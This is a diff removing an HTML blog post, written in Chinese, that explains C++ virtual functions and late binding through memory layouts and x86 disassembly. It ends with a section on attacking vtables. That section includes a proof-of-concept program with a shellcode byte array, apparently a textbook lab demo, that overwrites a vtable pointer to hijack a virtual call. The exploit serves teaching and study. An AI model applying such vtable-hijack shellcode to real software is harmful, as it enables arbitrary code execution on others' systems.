@@ -167,235 +167,6 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/09/23/C++%E6%99%9A%E8%81%94%E7%BC%96%E6%9C%BA%E5%88%B6%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
-      <meta itemprop="name" content="dustball">
-      <meta itemprop="description" content="dustland">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="dustland">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/09/23/C++%E6%99%9A%E8%81%94%E7%BC%96%E6%9C%BA%E5%88%B6%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0/" class="post-title-link" itemprop="url">C++晚联编机制如何实现</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-09-23 22:00:00" itemprop="dateCreated datePublished" datetime="2022-09-23T22:00:00+08:00">2022-09-23</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-09-24 23:44:26" itemprop="dateModified" datetime="2022-09-24T23:44:26+08:00">2022-09-24</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h1 id="c晚联编如何实现">C++晚联编如何实现</h1>
-<h2 id="虚函数对-对象的内存结构的影响">虚函数对
-对象的内存结构的影响</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> pack(1) <span class="comment">//取消所有对齐要求</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>&#123;</span></span><br><span class="line">    public:</span><br><span class="line">    <span class="type">char</span> only[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>&#123;</span></span><br><span class="line">    public:</span><br><span class="line">    <span class="type">char</span> only[<span class="number">1</span>];</span><br><span class="line">    virtual <span class="type">void</span> <span class="title function_">func</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">&#125;;</span><br><span class="line">A a;</span><br><span class="line">B b;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="keyword">sizeof</span>(A)&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;<span class="keyword">sizeof</span>(B)&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;&amp;a&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;&amp;a.only&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;&amp;b&lt;&lt;<span class="string">&quot;  &quot;</span>&lt;&lt;&amp;b.only&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\testC++\testCpp&gt; g++ main.cpp -O0 -o main -m32</span><br><span class="line">PS C:\Users\<span class="number">86135</span>\Desktop\testC++\testCpp&gt; ./main</span><br><span class="line"><span class="number">1</span>  <span class="number">5</span></span><br><span class="line"><span class="number">0x4da020</span>  <span class="number">0x4da020</span></span><br><span class="line"><span class="number">0x4da024</span>  <span class="number">0x4da028</span></span><br></pre></td></tr></table></figure>
-<p>a和b两个对象的唯一区别就是,b有一个虚函数,a没有</p>
-<p>但是b却又5个字节大小,a只有1个,</p>
-<p>a的基地址就是a的第一个成员only的基地址</p>
-<p>b的基地址加上4偏移才到其第一个成员only的基地址</p>
-<p>b最开始的4个字节究竟藏了什么呢?虚表指针</p>
-<h2 id="多态与晚联编">多态与晚联编</h2>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> &#123;</span></span><br><span class="line">public:</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in father func1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	virtual <span class="type">int</span> <span class="title function_">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> a + b;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in father func3&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span>public A &#123;</span><br><span class="line">public:</span><br><span class="line">	<span class="type">void</span> <span class="title function_">func1</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in son func1&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="type">void</span> <span class="title function_">func3</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;in son func3&quot;</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	A* handle = new B;</span><br><span class="line">	handle-&gt;func1();<span class="comment">//只有这种指针调用方式才可以多态</span></span><br><span class="line">	handle-&gt;func2(<span class="number">5</span>, <span class="number">6</span>);<span class="comment">//虚函数,但是没有重载调用子类虚函数</span></span><br><span class="line">	handle-&gt;func3();<span class="comment">//普通成员函数,但是handle是A类型指针,因此会调用A类的func3函数</span></span><br><span class="line">	delete handle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h3 id="a-handle-new-b">A* handle = new B;</h3>
-<p>main函数开始这么一坨,就干了<code>A* handle = new B;</code>这一个事</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922184558826.png"
-alt="image-20220922184558826" />
-<figcaption aria-hidden="true">image-20220922184558826</figcaption>
-</figure>
-<p>但是很迷的是,在主函数栈帧中,就对象的指针就有三个,handle1,handle2,handle,前两者都是临时的,在两三条指令中出现过之后就不再使用了,最后handle接管了大权.</p>
-<p>如果打开编译优化可能情况会好一点</p>
-<p>其中调用构造函数<code>??0B@@QAE@XZ</code>的时候,首先调用了父类的构造函数,在父类的构造函数中注册了父类的虚函数表,然后又回到本构造函数中,注册子类的虚函数表,覆盖了父类的虚函数表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.text:00641140 push    ebp</span><br><span class="line">.text:00641141 mov     ebp, esp</span><br><span class="line">.text:00641143 push    ecx</span><br><span class="line">.text:00641144 mov     [ebp+this], ecx</span><br><span class="line">.text:00641147 mov     ecx, [ebp+this] ; this</span><br><span class="line">.text:0064114A call    ??0A@@QAE@XZ    ; A::A(void)</span><br><span class="line">.text:0064114F mov     eax, [ebp+this]</span><br><span class="line">.text:00641152 mov     dword ptr [eax], offset ??_7B@@6B@ ; const B::`vftable&#x27;</span><br><span class="line">.text:00641158 mov     eax, [ebp+this]</span><br><span class="line">.text:0064115B mov     esp, ebp</span><br><span class="line">.text:0064115D pop     ebp</span><br><span class="line">.text:0064115E retn</span><br></pre></td></tr></table></figure>
-<h4 id="aa">A::A()</h4>
-<p>子类构造函数无论如何都会首先隐式执行父类的构造函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:00641160 push    ebp</span><br><span class="line">.text:00641161 mov     ebp, esp</span><br><span class="line">.text:00641163 push    ecx</span><br><span class="line">.text:00641164 mov     [ebp+this], ecx</span><br><span class="line">.text:00641167 mov     eax, [ebp+this]</span><br><span class="line">.text:0064116A mov     dword ptr [eax], offset ??_7A@@6B@ ; const A::`vftable&#x27;</span><br><span class="line">.text:00641170 mov     eax, [ebp+this]</span><br><span class="line">.text:00641173 mov     esp, ebp</span><br><span class="line">.text:00641175 pop     ebp</span><br><span class="line">.text:00641176 retn</span><br></pre></td></tr></table></figure>
-<p>这里关键的一点就是注册了父类的虚函数表,父类构造函数执行完之后,对象的状态是这样的</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192353739.png"
-alt="注册父类虚表指针" />
-<figcaption aria-hidden="true">注册父类虚表指针</figcaption>
-</figure>
-<h4 id="回到子类构造函数">回到子类构造函数</h4>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:0064114F mov     eax, [ebp+this]</span><br><span class="line">.text:00641152 mov     dword ptr [eax], offset ??_7B@@6B@ ; const B::`vftable&#x27;</span><br><span class="line">.text:00641158 mov     eax, [ebp+this]</span><br><span class="line">.text:0064115B mov     esp, ebp</span><br><span class="line">.text:0064115D pop     ebp</span><br><span class="line">.text:0064115E retn</span><br></pre></td></tr></table></figure>
-<p>从父类构造函数回来之后,又将B::vftable@rdata注册到对象的第一个双字上,覆盖了父类构造函数的注册效果</p>
-<p>实际上对于这个啥成员也没有的子类,父类构造函数真的执行了一个寂寞,它儿子不听话篡改了它老子的虚表指针</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192605634.png"
-alt="注册子类虚表指针,覆盖父类虚表指针" />
-<figcaption
-aria-hidden="true">注册子类虚表指针,覆盖父类虚表指针</figcaption>
-</figure>
-<p>A和B类的虚函数表都在rdata区,并且距离很近</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.rdata:006431FC ; void (__cdecl *const A::`vftable&#x27;[3])()</span><br><span class="line">.rdata:006431FC ??_7A@@6B@ dd offset ?func1@A@@UAEXXZ   ; DATA XREF: A::A(void)+A↑o</span><br><span class="line">.rdata:006431FC                                         ; A::func1(void)</span><br><span class="line">.rdata:00643200 dd offset ?func2@A@@UAEHHH@Z            ; A::func2(int,int)</span><br><span class="line">...</span><br><span class="line">.rdata:0064320C ; void (__cdecl *const B::`vftable&#x27;[3])()</span><br><span class="line">.rdata:0064320C ??_7B@@6B@ dd offset ?func1@B@@UAEXXZ   ; DATA XREF: B::B(void)+12↑o</span><br><span class="line">.rdata:0064320C                                         ; B::func1(void)</span><br><span class="line">.rdata:00643210 dd offset ?func2@A@@UAEHHH@Z            ; A::func2(int,int)</span><br></pre></td></tr></table></figure>
-<p>虽然只有两个虚函数,但是虚函数表有三项,其中前两项是函数指针,最后一项用NULL表示虚函数表结束</p>
-<p>还要注意的是,两个虚函数表中的func1是不同的函数指针,但是func2是同一个函数指针</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?func1@A@@UAEXXZ</span><br><span class="line">?func1@B@@UAEXXZ</span><br><span class="line">?func2@A@@UAEHHH@Z </span><br></pre></td></tr></table></figure>
-<p>这是因为子类没有重载了func1,但是没有重载func2,于是两个虚表的第一个指针分别指向两个不同的函数,两个虚表的第二个指针指向同一个函数</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922200159404.png"
-alt="image-20220922200159404" />
-<figcaption aria-hidden="true">image-20220922200159404</figcaption>
-</figure>
-<p>虚表位于rdata区,可想而知,这里的虚函数指针值在编译链接时就已经决定了,整个运行过程中不会发生变化</p>
-<p><strong>因此可以说多态的关键,就在于构造函数一开始注册哪个类的虚函数表</strong></p>
-<h3 id="handle-func1">handle-&gt;func1();</h3>
-<p>下面马上就要调用第一个虚函数了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:006410E3 mov     ecx, [ebp+handle];对象地址放到ecx中作为this指针</span><br><span class="line">.text:006410E6 mov     edx, [ecx];对象的第一个双字放到edx中</span><br><span class="line">.text:006410E8 mov     ecx, [ebp+handle];对象地址放到ecx中作为this指针</span><br><span class="line">.text:006410EB mov     eax, [edx];对象的第一个双字再解引用取得的值放到eax中</span><br><span class="line">.text:006410ED call    eax;调用eax中的地址</span><br></pre></td></tr></table></figure>
-<p>这个过程画在图上相当于</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220922192743617.png"
-alt="调用一个虚函数" />
-<figcaption aria-hidden="true">调用一个虚函数</figcaption>
-</figure>
-<blockquote>
-<p>所谓"动态联编"或者"晚联编"就体现在这里,要调用的虚函数是以变量的形式放到eax中调用的</p>
-<p>而一般调用函数都是直接写死了<code>call 函数地址</code></p>
-<p>并且在调用虚函数的时候,编译器还真不知道要调用哪个函数</p>
-<p>编译器只是在对象的构造函数中注册该对象的虚表,覆盖父类的虚表,然后后来在调用虚函数的时候只需要查虚表,而无需关心这是谁的虚表,因为构造函数时已经注册好这是谁的虚表了</p>
-</blockquote>
-<h3 id="handle-func25-6">handle-&gt;func2(5, 6);</h3>
-<p>第二个虚函数,与func1虚函数的主要区别是,子类重写了func1,但是没有重写func2</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:006410EF push    6</span><br><span class="line">.text:006410F1 push    5</span><br><span class="line">.text:006410F3 mov     ecx, [ebp+handle];ecx中是对象的地址</span><br><span class="line">.text:006410F6 mov     edx, [ecx];edx是对象的第一个双字</span><br><span class="line">.text:006410F8 mov     ecx, [ebp+handle];ecx是对象的地址</span><br><span class="line">.text:006410FB mov     eax, [edx+4];对象的第一个双字的值加上4,也就是虚函数表偏移4</span><br><span class="line">.text:006410FE call    eax</span><br></pre></td></tr></table></figure>
-<p><code>&amp;vtable+4=vtable[1]</code></p>
-<p>相当于调用了<code>vtable[1]</code>上面存放的函数</p>
-<h3 id="handle-func3">handle-&gt;func3();</h3>
-<p>普通的成员函数,但是该函数被子类重载过,</p>
-<p>由于对象的指针是父类指针,因此这里会调用父类的func3函数</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00641100 mov     ecx, [ebp+handle] ; this</span><br><span class="line">.text:00641103 call    ?func3@A@@QAEXXZ ; A::func3(void)</span><br></pre></td></tr></table></figure>
-<p>这个函数的调用十分滴简单</p>
-<p>根据stdcall调用约定,ecx中放上对象地址,然后就直接调用成员函数了</p>
-<p>为了区分子类函数和父类函数,vc++编译器给父类的func3函数命名为<code>?func3@A@@QAEXXZ</code></p>
-<p>这是在编译链接的时候就写死了的</p>
-<h3 id="为什么要有虚表呢">为什么要有虚表呢?</h3>
-<p>虚表起码可以是在编译链接阶段可以决定的,为了让运行时需要做的事情尽可能少,应该存在虚表这个东西</p>
-<p>虚表不能直接放到对象里面吗?不能</p>
-<p>一是因为,一种类型的所有对象,共用一个虚表,因此在进程地址空间中只保留一个虚表就够了,这有点类似于共享库的缩影.</p>
-<p>二是因为,如果把虚函数的地址直接放到对象里面,会导致对象臃肿.</p>
-<p>现在在对象里面只保留一个虚表指针,只会给对象增加4个字节的空间,已经算是最合理的设计了</p>
-<h2 id="调用和.调用"><code>-&gt;</code>调用和<code>.</code>调用</h2>
-<p>对象.成员函数,这种调用方式不会触发多态,不会访问虚函数表,子类就调用子类重写的成员函数,没有重写则调用父类的</p>
-<p>指针-&gt;成员函数,这种调用方式会触发多态,通过虚函数表决定执行哪个函数</p>
-<p>同样的程序,使用对象.这种调用方式</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">	B b;</span><br><span class="line">    b.func1();</span><br><span class="line">    b.func2(<span class="number">5</span>,<span class="number">6</span>);</span><br><span class="line">    b.func3();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>实际上根本没有访问虚表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">mov     eax, offset off_4D71D0</span><br><span class="line">mov     [ebp+var_C], eax</span><br><span class="line">lea     eax, [ebp+var_C]</span><br><span class="line">mov     ecx, eax</span><br><span class="line">call    __ZN1B5func1Ev  ; B::func1(void);写死的访问哪个函数</span><br><span class="line">lea     eax, [ebp+var_C]</span><br><span class="line">mov     dword ptr [esp+4], 6 ; int</span><br><span class="line">mov     dword ptr [esp], 5 ; this</span><br><span class="line">mov     ecx, eax</span><br><span class="line">call    __ZN1A5func2Eii ; A::func2(int,int);写死的访问哪个函数</span><br><span class="line">sub     esp, 8</span><br><span class="line">lea     eax, [ebp+var_C]</span><br><span class="line">mov     ecx, eax</span><br><span class="line">call    __ZN1B5func3Ev  ; B::func3(void);写死的访问哪个函数</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
-<h2 id="虚函数漏洞">虚函数漏洞</h2>
-<h3 id="虚表指针与虚函数指针">虚表指针与虚函数指针</h3>
-<p>virtual修饰的成员函数,虚函数</p>
-<p>虚函数的入口地址统一的保存在虚表中</p>
-<p>对象调用虚函数时首先通过<strong>虚表指针</strong>找到虚表,然后从虚表中取出虚函数地址,然后call</p>
-<p>虚表指针保存在对象的内存空间,紧接着虚表指针的是其他成员变量</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920225443155.png"
-alt="image-20220920225443155" />
-<figcaption aria-hidden="true">image-20220920225443155</figcaption>
-</figure>
-<p>如何攻击这个机制呢?</p>
-<p>这是本来的状态</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923222434821.png"
-alt="本来状态" />
-<figcaption aria-hidden="true">本来状态</figcaption>
-</figure>
-<p>可以修改对象头4个字节的虚表地址,改成假的虚表地址,这个假虚表上维护着shellcode的地址</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923222852145.png"
-alt="修改虚表指针" />
-<figcaption aria-hidden="true">修改虚表指针</figcaption>
-</figure>
-<p>还可以保持虚表指针不变,修改虚表中的函数地址</p>
-<figure>
-<img
-src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220923225918430.png"
-alt="修改虚函数地址" />
-<figcaption aria-hidden="true">修改虚函数地址</figcaption>
-</figure>
-<h3 id="存在漏洞的代码">存在漏洞的代码</h3>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Failwest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>每个Failwest函数的最初四个字节,在buf之前,都是虚表指针,</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;iostream.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> shellcode[]=</span><br><span class="line"><span class="string">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="string">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="string">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="string">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="string">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="string">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="string">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="string">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="string">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="string">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x1C\x88\x40\x00&quot;</span>;<span class="comment">//set fake virtual function pointer</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Failwest</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">public:</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line">	virtual <span class="type">void</span> <span class="title function_">test</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;Class Vtable::test()&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line">Failwest overflow, *p;</span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> * p_vtable;</span><br><span class="line">	p_vtable=overflow.buf<span class="number">-4</span>;<span class="comment">//point to virtual table</span></span><br><span class="line">	<span class="comment">//__asm int 3</span></span><br><span class="line">	<span class="comment">//reset fake virtual table to 0x004088cc</span></span><br><span class="line">	<span class="comment">//the address may need to ajusted via runtime debug</span></span><br><span class="line">	p_vtable[<span class="number">0</span>]=<span class="number">0xCC</span>;</span><br><span class="line">	p_vtable[<span class="number">1</span>]=<span class="number">0x88</span>;</span><br><span class="line">	p_vtable[<span class="number">2</span>]=<span class="number">0x40</span>;</span><br><span class="line">	p_vtable[<span class="number">3</span>]=<span class="number">0x00</span>;</span><br><span class="line">	<span class="built_in">strcpy</span>(overflow.buf,shellcode);<span class="comment">//set fake virtual function pointer</span></span><br><span class="line">	p=&amp;overflow;</span><br><span class="line">	p-&gt;test();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>overflow是全局位置定义的一个Failwest对象,他有一个成员变量数组char
-buf[200],还有一个虚函数test</p>
-<p>通过修改虚函数表中虚函数的地址就可以让p-&gt;test()这种调用方式上当</p>
-<p>虚函数表指针位于对象的第一个成员之前4个字节,因此一开始</p>
-<p><code>char *p_vtable=overflow.buf-4</code>此时p_vtable指针和overflow.buf的虚表指针指向同一块地址了</p>
-<p>由于overflow对象只有一个虚函数,因此虚表一开始就是该虚函数的实际地址.</p>
